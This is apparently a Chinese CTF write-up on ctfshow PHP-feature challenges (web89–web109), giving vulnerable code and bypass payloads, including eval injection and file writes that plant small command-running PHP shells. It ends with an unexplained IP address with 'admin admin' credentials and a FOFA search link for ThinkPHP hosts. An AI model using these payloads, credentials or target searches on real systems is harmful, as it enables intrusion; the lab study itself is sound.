---
 layout:  post    # 使用的布局（不需要改）
 title:  从0开始学web之php特性  # 标题 
 subtitle:  ctfshow   #副标题
 date:  2020-11-22  # 时间
 author:  yanmie    # 作者
 header-img: img/.jpg ##标签这篇文章标题背景图片
 catalog: true      # 是否归档
 tags:        
   - CTF

---


## web89~数组绕过preg_match

```php
<?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
} 
```

* preg_match — 执行匹配正则表达式

> 返回值：
>
> **preg_match()**返回 `pattern` 的匹配次数。  它的值将是0次（不匹配）或1次，因为**preg_match()**在第一次匹配后  将会停止搜索。[preg_match_all()](https://www.php.net/manual/zh/function.preg-match-all.php)不同于此，它会一直搜索`subject`  直到到达结尾。   如果发生错误**preg_match()**返回 **`FALSE`**。  

数组绕过

当匹配数组是返回false绕过。

```php
?num[]=1
```

## web90~intval函数

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

* **intval()** 函数用于获取变量的整数值。

  **intval()** 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

> ```
> int intval ( mixed $var [, int $base = 10 ] )
> ```
>
> 参数说明：
>
> - $var：要转换成 integer 的数量值。
> - $base：转化所使用的进制。
>
> 如果 base 是 0，通过检测 var 的格式来决定使用的进制：
>
> - 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
> - 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
> - 将使用 10 进制 (decimal)。

传参一个数既要使其不强等于`4476` ,又要使得`intaval`函数处理后的结果强等于`4476`,结合上述函数解释

构造

```
?num=4476a
```

## web91~/m之%0a绕过

```php
<?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}

Notice: Undefined index: cmd in /var/www/html/index.php on line 15
nonononono
```



[![D3vAXQ.md.png](https://s3.ax1x.com/2020/11/22/D3vAXQ.md.png)](https://imgchr.com/i/D3vAXQ)

题目要求，传参 cmd.

但是第一个正则匹配要求多行匹配`php`,但是另一个要求有去掉修饰符`m`要求不匹配`php` .那么就应该能想到是截断。

第一个匹配多行，第二个只匹配单行，那么我们可以构造`php%0ap` 进行匹配，当多行匹配的时候前后都是`p` ,

还可以这里有有两个条件，第一个需要是php，第二个又不可以php，不过有个差距就是m模式，/m代表匹配多行数据，第一个if有匹配到第二行的php,而第二个if匹配不到为假。

CVE-2017-15715

https://blog.csdn.net/qq_46091464/article/details/108278486



## web92~intval八十六进制科学计数法绕过

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

同样考点是`intval` ，但这道题不同于web90,而是弱比较，所以说`4476a`等肯定不行的。

这里用到十六进制`0x117c` 或者八进制`010574`

https://www.runoob.com/php/php-intval-function.html

也可以科学计数法`4476e2` ,在第一个if会计数比较，在`intval`函数中会被看做字符串。

## web93~intval八进制绕过

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

过滤了字母，但我们可以使用八进制`010574`

## web94~八进制，小数点绕过

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

* `strpos`查找 "php" 在字符串中第一次出现的位置：
* strpos() 函数对大小写敏感。
* 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。

比上一关增加条件，strpos函数限制了传参第一位不能为0，如果为0，就die.

但是如果找不到的话又会die.

仔细观察这里时强等于。

我们可以在八进制前加一个空格 
```
?num=  010574
```

或者用小数点

```
?num=4476.0
```

或者再加个 + 

```
?num=+4476.0
```

## web95~空格加八进制绕intval

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

又增加过滤了`.`

构造`空格+八进制`

```
?num=  010574
```

也可以

```
?num=+010574
?num=%2b010574
```



## web96~绝对路径相对路径

```php
<?php

highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}
```

可以看到不能直接等于`flag.php`,

但是我们可以构造路劲让其显示

```php
?u=/var/www/html/flag.php
?u=./flag.php
```

## web97~md5数组绕过

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>

```

这里是强比较。

弱比较的话可以百度有好多md5加密后是0e开头的，弱比较 0=0

**强比较**

如果传入`md5` 函数的不是字符串而是数组，那么就会返回`null`, null=null绕过。

构造

```php
a[]=1&b[]=2
```

还有md5强碰撞

https://blog.csdn.net/EC_Carrot/article/details/109525162

https://www.cnblogs.com/kuaile1314/p/11968108.html

## web98~三元运算地址引用

```php

Notice: Undefined index: flag in /var/www/html/index.php on line 15

Notice: Undefined index: flag in /var/www/html/index.php on line 16

Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
<?php
    
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```

三元符运算，和传址(引用) 

```php
$_GET?$_GET=&$_POST:'flag';  //只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)
```

那么看最后要求`$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__`  那么我们就可以直接随意get传参一个，然后post传参`HTTP_FLAG=flag` 即可获得flag.

看看wp:

```php
https://www.php.cn/php-notebook-172859.html https://www.php.cn/php-weizijiaocheng-383293.html 考点是PHP里面的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址 我们可以修改一下代码

<?php
include('flag.php');
if($_GET){
	$_GET=&$_POST;//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地
址)
}else{
	"flag";
} 
if($_GET['flag']=='flag'){
	$_GET=&$_COOKIE;
}else{
	'flag';
} 
if($_GET['flag']=='flag'){
	$_GET=&$_SERVER;
}else{
'flag';
} 
if($_GET['HTTP_FLAG']=='flag'){//需要满足这个条件就可以输出flag
	highlight_file($flag);
}else{
	highlight_file(__FILE__);
}
所以我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag
中间的代码没有作用，因为我们不提交 flag 参数
```

## web99~in_array()漏洞

```php
<?php

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

[![DtG78J.md.png](https://s3.ax1x.com/2020/11/24/DtG78J.md.png)](https://imgchr.com/i/DtG78J)

、**意为当没有设置第三个函数时，比较是会自动转换数据类型，也就是弱比较。**

那么我们传入`1.php` 就相当于若等于`1` .

构造

```php
/?n=1.php  
# post
content=<?php system('cat flag36d.php');?>
```

## web100~运算符优先级,反射类

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}


?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

这里有问题，又学费了。

php  `=` 的运算符竟然比 `and` 高。

> https://www.jb51.net/article/42425.htm
>
> && > || > = > and > or

```php
<?php
$a=true and false and false;
var_dump($a);  返回true

$a=true && false && false;
var_dump($a);  返回false
```

[![DtN6oV.md.png](https://s3.ax1x.com/2020/11/24/DtN6oV.md.png)](https://imgchr.com/i/DtN6oV)



https://www.php.net/manual/zh/language.operators.precedence.php

所以这时候就很清晰明了了。

只需要传入的 `v1` 值是数字。`v3` 必须有`;` 。

构造

```php
# 直接输出$ctfshow;构造出 var_dump($ctfshow);
?v1=1&v2=var_dump($ctfshow)/*&v3=*/;

?v1=1&v2=var_dump(new ctfshow())/*&v3=*/;

# 因为过滤的字符比较少，所以可以直接执行命令。
?v1=1&v2=system('ls')/*&v3=*/;

/?v1=1&v2=system('ls')&v3=;    # 会报错但也可出来
```

反射类: https://www.php.net/manual/zh/class.reflectionclass.php

```php
?v1=1&v2=echo new ReflectionClass('ctfshow')/*&v3=*/;

?v1=1&v2=echo new ReflectionClass&v3=;
```

反射类用法：

```php
<?php
class A{
public static $flag="flag{123123123}";
const  PI=3.14;
static function hello(){
    echo "hello</br>";
}
}
$a=new ReflectionClass('A');


var_dump($a->getConstants());  获取一组常量
输出
 array(1) {
  ["PI"]=>
  float(3.14)
}

var_dump($a->getName());    获取类名
输出
string(1) "A"

var_dump($a->getStaticProperties()); 获取静态属性
输出
array(1) {
  ["flag"]=>
  string(15) "flag{123123123}"
}

var_dump($a->getMethods()); 获取类中的方法
输出
array(1) {
  [0]=>
  object(ReflectionMethod)#2 (2) {
    ["name"]=>
    string(5) "hello"
    ["class"]=>
    string(1) "A"
  }
}
```

https://blog.csdn.net/miuzzx/article/details/109168454

解出来

```
flag_is_d3e0a1060x2d8b970x2d4f790x2db73d0x2d542e6338bca7
```

有点小坑，仔细看才发现有好多`0x2d`

```
flag{d3e0a106-8b97-4f79-b73d-542e6338bca7}
```



## web101~反射类

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

跟上道题差不多，过滤的严了一些。过滤掉了`\ ` 和反引号，单引号，括号。

只能用反射类了。

构造 
```php
?v1=1&v2=echo new ReflectionClass&v3=;
```

同样结果注意flag格式

## web102~hex2bin,base64编码后都为数字

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}


?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 14

Notice: Undefined index: v2 in /var/www/html/index.php on line 15

Notice: Undefined index: v3 in /var/www/html/index.php on line 16
hacker
```

这里要求`v2` 是数字，并且截取第三位后的字符作为`call_user_func` 的第二个参数。

`v1` 作为 `call_user_func` 的第一个参数。

`v3` 作为 `file_put_contents` 的文件名。

`call_user_func($v1,$s);` 返回结果作为`file_put_contents`  的第二参数。



is_numeric 函数是又漏洞的，再 php5 版本下是可以识别十六进制的。也就是说，如果传入`v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e(<?php eval($_POST[1]);?>的十六进制)`也是可以识别为数字的。

但此题是 php7 环境。不可以。

要让v2均为数字，首先我们考虑写入1.php时，利用伪协议写入

```php
get:v2=？？？&v3=php://filter/write=convert.base64-decode/resource=1.php
post: v1=hex2bin
```

关键就是什么代码base64编码后再转为十六进制为全数字

```php
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。
输出   5044383959474e6864434171594473
带e的话会被认为是科学计数法，可以通过is_numeric检测。
```

同时因为经过substr处理，所以v2前面还要补两位数字。

构造

```php
?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php

# post
v1=hex2bin
```

或者

```php
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
#访问1.php后查看源代码获得flag
# 115044383959474e6864434171594473 16进制转字符 PD89YGNhdCAqYDs base64解码  <?=`cat *YDs
```

## web103~hex2bin

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 14

Notice: Undefined index: v2 in /var/www/html/index.php on line 15

Notice: Undefined index: v3 in /var/www/html/index.php on line 16
hacker
```

相比上关过滤了`php` .

用上关payload也可以打通。

## web104~sha1弱相等

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}



?>
```

* sha1 — 计算字符串的 sha1 散列值.  返回 sha1 散列值字符串。  

> sha1()函数无法处理数组类型，将报错并返回false，

所以构造

```
?v2[]=1

# post
v1[]=1
```

这里没有判断两值是否相等，所以也可以传入两个相等的数。

```
?v2=2

v1=2
```

还有几个弱比较相等的字符串

```
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
```

## web105~$$变量覆盖

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？
```

变量覆盖。

代码审计，直接传入

```php
?suces=flag
    
# post
error=suces
```

这里把`suces` 和 `error` 都覆盖成了 `$flag` ，所以不管die 哪个，都会输出flag.

## web106~sha1弱比较

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}

?>
```

数组绕过。

还有

```php
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
```

## web107~MD5弱比较

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}

?>
```

MD5弱类型比较。

* parse_str() 函数把查询字符串解析到变量中。

> 注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
>
> 注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

[![D681hj.md.png](https://s3.ax1x.com/2020/11/28/D681hj.md.png)](https://imgchr.com/i/D681hj)

1. 数组绕过

   md5加密数组会返回NULL，$v2['flag'] 也是NULL。

   ```
   ?v3[]=1
   
   v1[]=flag=0
   ```

3. 弱比较绕过

   ```
   0e开头的md5和原值：
   QNKCDZO
   0e830400451993494058024219903391
   240610708
   0e462097431906509019562988736854
   s878926199a
   0e545993274517709034328855841020
   s155964671a
   0e342768416822451524974117254469
   s214587387a
   0e848240448830537924465865611904
   s214587387a
   0e848240448830537924465865611904
   s878926199a
   0e545993274517709034328855841020
   s1091221200a
   0e940624217856561557816327384675
   s1885207154a
   0e509367213418206700842008763514
   s1502113478a
   0e861580163291561247404381396064
   s1885207154a
   0e509367213418206700842008763514
   s1836677006a
   0e481036490867661113260034900752
   s155964671a
   0e342768416822451524974117254469
   s1184209335a
   0e072485820392773389523109082030
   s1665632922a
   0e731198061491163073197128363787
   s1502113478a
   0e861580163291561247404381396064
   s1836677006a
   0e481036490867661113260034900752
   s1091221200a
   0e940624217856561557816327384675
   s155964671a
   0e342768416822451524974117254469
   s1502113478a
   0e861580163291561247404381396064
   s155964671a
   0e342768416822451524974117254469
   s1665632922a
   0e731198061491163073197128363787
   s155964671a
   0e342768416822451524974117254469
   s1091221200a
   0e940624217856561557816327384675
   s1836677006a
   0e481036490867661113260034900752
   s1885207154a
   0e509367213418206700842008763514
   s532378020a
   0e220463095855511507588041205815
   s878926199a
   0e545993274517709034328855841020
   s1091221200a
   0e940624217856561557816327384675
   s214587387a
   0e848240448830537924465865611904
   s1502113478a
   0e861580163291561247404381396064
   s1091221200a
   0e940624217856561557816327384675
   s1665632922a
   0e731198061491163073197128363787
   s1885207154a
   0e509367213418206700842008763514
   s1836677006a
   0e481036490867661113260034900752
   s1665632922a
   0e731198061491163073197128363787
   s878926199a
   0e545993274517709034328855841020
   ```

## web108~ereg %00截断漏洞

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
error
```

* ereg — 正则表达式匹配
* ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，**导致了正则过滤被绕过,所以可以使用%00截断正则匹配**

`0x36d` 是     `877`

所以构造

```
?c=a%00aaaa778
```

当通过`strrev` 和`intval` 的时候，为 877

## web109

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}

?>
```

http://119.183.219.100:8090/index.php  admin   admin



https://fofa.so/result?q=app%3D%22ThinkPHP%22+%26%26+country%21%3D%22CN%22&qbase64=YXBwPSJUaGlua1BIUCIgJiYgY291bnRyeSE9IkNOIg%3D%3D#will_page

